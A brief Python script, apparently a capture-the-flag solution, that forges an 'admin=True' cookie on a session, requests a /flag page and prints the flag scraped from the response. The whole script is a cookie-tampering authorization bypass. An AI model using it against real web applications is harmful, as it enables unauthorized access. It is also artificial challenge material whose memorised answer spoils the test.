import requests
from bs4 import BeautifulSoup as bs

url = ""
login_url = url+"/login"
flagUrl = url+"/flag"

session = requests.Session()
session.cookies.set("admin", "True")
response = session.get(flagUrl)
soup = bs(response.text, 'html.parser')
flag = soup.find('code').text
print(flag)